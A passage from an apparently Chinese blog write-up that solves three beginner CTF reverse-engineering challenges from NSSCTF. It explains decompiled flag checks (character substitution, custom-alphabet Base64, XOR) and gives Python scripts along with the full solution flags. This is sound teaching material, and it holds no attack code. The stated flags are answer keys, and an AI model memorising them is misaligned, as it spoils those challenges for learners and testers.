将目标字符串 &quot;&#123;34sy_r3v3rs3&#125;&quot; 复制到 Str2 数组中 printf(&quot;please put your flag:&quot;); // 打印提示消息，要求用户输入标志 scanf(&quot;%s&quot;, Str1); // 从用户输入中读取字符串，并存储到 Str1 数组中 for ( i = 0; i &lt;= 665; ++i ) // 循环遍历 Str1 中的每个字符，进行替换操作 &#123; if ( Str1[i] == 101 ) // 如果当前字符是 ASCII 值为 101 的 &#x27;e&#x27;，则将其替换为 ASCII 值为 51 的 &#x27;3&#x27; Str1[i] = 51; &#125; for ( i = 0; i &lt;= 665; ++i ) &#123; if ( Str1[i] == 97 ) // 如果当前字符是 ASCII 值为 97 的 &#x27;a&#x27;，则将其替换为 ASCII 值为 52 的 &#x27;4&#x27; Str1[i] = 52; &#125; if ( strcmp(Str1, Str2) ) // 比较 Str1 和 Str2 是否相等，若不相等则执行下一步操作 printf(&quot;you are wrong,see again!&quot;); else printf(&quot;you are right!&quot;); // 若相等则打印提示消息，表示输入正确 system(&quot;pause&quot;); return 0; 以上代码实现了一个替换字符的动作，用户输入的“Flag”经过上述转换后若是等于”{34sy_r3v3rs3}”则输入正确；也就是说只需要将得到”{34sy_r3v3rs3}”的动作逆转即可，逆转过程使用Python实现： 123456789101112str = &#x27;&#123;34sy_r3v3rs3&#125;&#x27;new_str = &#x27;&#x27; # 创建一个新的字符串来存储修改后的结果for i in str: if ord(i) == 51: new_str += chr(101) # 将字符 &#x27;3&#x27; 替换为字符 &#x27;e&#x27; elif ord(i) == 52: new_str += chr(97) # 将字符 &#x27;4&#x27; 替换为字符 &#x27;a&#x27; else: new_str += i # 如果不需要替换，则保留原字符print(new_str) 运行结果如下图： 对结果进行验证： 结果正确，题目摘抄于NSSCTF平台，即完整Flag为：NSSCTF&#123;easy_reverse&#125; HUBUCTF 2022 新生赛-simple_RE下载附件，是一个压缩包，里面有一个exe可执行文件： 拖进IDA进行分析，发现有一串字符串，先找到main函数： 按F5反编译分析伪代码的结构： 代码如下，丢去GPT协助分析一下，程序的大致逻辑是用户输入一个字符串，经过函数转换后与内置的另一个字符串进行比较，正确即显示success!： 12345678910111213141516171819int __fastcall main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+24h] [rbp-44h] BYREF void *Buf1; // [rsp+28h] [rbp-40h] BYREF char v6[56]; // [rsp+30h] [rbp-38h] BYREF sub_401770(argc, argv, envp); printf(&quot;please input the flag:&quot;); scanf(&quot;%s&quot;, v6); Buf1 = 0i64; sub_401570(v6, &amp;Buf1, &amp;v4); if ( !memcmp(Buf1, a5mc58bphliax7j, v4) ) printf(&quot; success!&quot;); else printf(&quot; failed!&quot;); if ( Buf1 ) free(Buf1); return 0;&#125; &#x2F;&#x2F; int v4; &#x2F;&#x2F; [rsp+24h] [rbp-44h] BYREF：定义一个整型变量 v4，用于存储结果长度。 &#x2F;&#x2F; void *Buf1; &#x2F;&#x2F; [rsp+28h] [rbp-40h] BYREF：定义一个指针变量 Buf1，用于存储 Base64 编码后的结果。 &#x2F;&#x2F; char v6[56]; &#x2F;&#x2F; [rsp+30h] [rbp-38h] BYREF：定义一个字符数组 v6，用于存储用户输入的字符串，长度为 56 个字节。 &#x2F;&#x2F; sub_401770(argc, argv, envp);：调用子函数 sub_401770，并将 argc、argv 和 envp 作为参数传递进去。该函数的具体功能需要查看其定义。 &#x2F;&#x2F; printf(“please input the flag:”);：打印提示信息，要求用户输入标志。 &#x2F;&#x2F; scanf(“%s”, v6);：通过键盘输入获取用户输入的字符串，并存储在变量 v6 中。 &#x2F;&#x2F; Buf1 &#x3D; 0i64;：将指针变量 Buf1 初始化为 NULL，即空指针。 &#x2F;&#x2F; sub_401570(v6, &amp;Buf1, &amp;v4);：调用子函数 sub_401570，并将用户输入的字符串 v6、结果指针的地址 &amp;Buf1 和结果长度的地址 &amp;v4 作为参数传递进去。该函数的具体功能需要查看其定义。 &#x2F;&#x2F; if ( !memcmp(Buf1, a5mc58bphliax7j, v4) )：通过 memcmp 函数比较 Buf1 指向的内存区域和 a5mc58bphliax7j 指向的内存区域的前 v4 个字节是否相等。如果相等，则说明用户输入的标志是正确的。 &#x2F;&#x2F; printf(“ success!”);：打印成功信息。 &#x2F;&#x2F; else printf(“ failed!”);：如果用户输入的标志不正确，则打印失败信息。 &#x2F;&#x2F; if ( Buf1 ) free(Buf1);：释放动态分配的内存空间，避免内存泄漏。 &#x2F;&#x2F; return 0;：程序正常退出，并返回 0 表示成功。 从代码中可以看到，用户输入的字符串被函数sub_401570转换后被用来与a5mc58bphliax7j变量进行比较，点进a5mc58bphliax7j中查看为一串Base64的编码： 再看看函数sub_401570实现的是什么功能： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465__int64 __fastcall sub_401570(const char *a1, _QWORD *a2, int *a3)&#123; int v6; // r15d int v7; // r12d int v8; // r13d __int64 v9; // r14 _BYTE *v10; // rax _BYTE *v11; // r9 __int64 v12; // r8 char v13; // cl char v14; // r11 char v15; // r10 __int64 result; // rax v6 = strlen(a1); v7 = v6 % 3; if ( v6 % 3 ) &#123; v8 = 4 * (v6 / 3) + 4; v9 = v8; v10 = malloc(v8 + 1i64); v10[v8] = 0; if ( v6 &lt;= 0 ) goto LABEL_5; &#125; else &#123; v8 = 4 * (v6 / 3); v9 = v8; v10 = malloc(v8 + 1i64); v10[v8] = 0; if ( v6 &lt;= 0 ) goto LABEL_8; &#125; v11 = v10; v12 = 0i64; do &#123; v11 += 4; v13 = a1[v12]; *(v11 - 4) = aQvejafhmuyjbac[v13 &gt;&gt; 2]; v14 = a1[v12 + 1]; *(v11 - 3) = aQvejafhmuyjbac[(v14 &gt;&gt; 4) | (16 * v13) &amp; 0x30]; v15 = a1[v12 + 2]; v12 += 3i64; *(v11 - 2) = aQvejafhmuyjbac[(v15 &gt;&gt; 6) | (4 * v14) &amp; 0x3C]; *(v11 - 1) = aQvejafhmuyjbac[v15 &amp; 0x3F]; &#125; while ( v6 &gt; (int)v12 );LABEL_5: if ( v7 == 1 ) &#123; v10[v9 - 2] = 61; v10[v9 - 1] = 61; &#125; else if ( v7 == 2 ) &#123; v10[v9 - 1] = 61; &#125;LABEL_8: *a2 = v10; result = 0i64; *a3 = v8; return result;&#125; 丢进GPT内分析后知道这段代码实现的是一个Base64编码的过程，但是字母表更换了，使用了aQvejafhmuyjbac内的字母表： 这里附上Base64编码的原理： 将二进制数据分割成 6 位一组： 首先，将需要编码的二进制数据按照 6 位一组进行分割。 将每组 6 位转换成一个 Base64 字符： 对于每一组 6 位的二进制数据，将其转换成对应的 Base64 字符。Base64 字符集包含 64 个字符，通常包括 A-Z、a-z、0-9 这 62 个字符，以及两个额外的字符，通常是 “+” 和 “&#x2F;“，共计 64 个字符。 对不足 6 位的二进制数据进行填充： 如果最后一组的二进制数据不足 6 位，需要进行填充。通常使用字符 “&#x3D;” 来填充。 将所有的 Base64 字符串连接起来： 将每组转换后的 Base64 字符串连接起来，形成最终的 Base64 编码结果。 至此，整个程序的逻辑为：接受用户输入的字符串，然后通过自定义的字母表进行Base64编码，然后再与给定字符串进行比较，一样则成功，反之失败；则解题关键就是将给定的字符串通过自定义的字母表Base64解码即可： 或者通过脚本转换： 123456789101112131415161718import base64str1 = &#x27;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==&#x27;string1 = &quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(base64.b64decode(str1.translate(str.maketrans(string1,string2))))# maketrans函数的作用是创建字符映射的转换表。# translate(table)函数的作用是根据参数 table 给出的表（包含 256 个字符）转换字符串的字符，table是通过 maketrans()方法转换而来。# 以上面的这个例子来说，即将字符串str1中的涉及string1的内容（部分也算）转换成string2中的内容，再通过默认的Base64方法解码。# 那么str1是如何计算出来的呢？为了更加方便理解以上代码，以下是str1的推导过程。import base64string1 = &quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag = &#x27;NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125;&#x27;print(base64.b64encode(flag.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;).translate(str.maketrans(string2, string1)))# 结合以上两段代码，能更好的理解“base64.b64decode(str1.translate(str.maketrans(string1,string2)))”此段代码的工作原理。 最后将结果输入进程序验证是否正确，程序一闪而过，可看到success！的字样： 题目摘自NSSCTF平台，即Flag为：NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125; HNCTF 2022 Week1-X0r下载附件，便于记录进行改名，为一个exe执行程序： 丢进PE查壳和其他信息： 无壳，64位，丢进64位IDA中分析，找到main函数，F5反编译分析伪代码： 代码如下： 123456789101112131415161718192021222324int __fastcall main(int argc, const char **argv, const char **envp)&#123; char Str[44]; // [rsp+20h] [rbp-30h] BYREF int i; // [rsp+4Ch] [rbp-4h] _main(); puts(&quot;please input your flag!&quot;); scanf(&quot;%s&quot;, Str); if ( strlen(Str) != 22 ) &#123; printf(&quot;strlen error!&quot;); exit(0); &#125; for ( i = 0; i &lt;= 21; ++i ) &#123; if ( arr[i] != (Str[i] ^ 0x34) + 900 ) &#123; printf(&quot;flag error!&quot;); exit(0); &#125; &#125; printf(&quot;you are right!&quot;); return 0;&#125; 代码主要有一个判断点，判断输入的字符串长度是否等于22；确认字符串长度无误后对输入的字符串进行遍历，让字符串里的每一个字符与0x34进行异或并+900，最后与arr数组里的字符比较，错误则输出错误信息。那解题的关键即在arr数组中，点进去看看内容： 结合前面的分析，思路已经很清晰了，只需要将arr数组中的数据逆向回去即可得到Flag，使用Python转换，脚本如下： 上图数据中的“h”代表十六进制的意思； “2 dup”则表示该数据重复两次的意思。 1234arr = [0x3FE,0x3EB,0x3EB,0x3FB,0x3E4,0x3F6,0x3D3,0x3D0,0x388,0x3CA,0x3EF,0x389,0x3CB,0x3EF,0x3CB,0x388,0x3EF,0x3D5,0x3D9,0x3CB,0x3D1,0x3CD]flag = &quot;&quot;for i in range(len(arr)): flag += chr((arr[i] - 900) ^ 0x34) 将arr中的数据先-900再与0x34异或即可获得Flag： 题目摘自NSSCTF平台，即Flag为：NSSCTF&#123;x0r_1s_s0_easy&#125;","tags":["CTF"],"categories":["CTF"]}]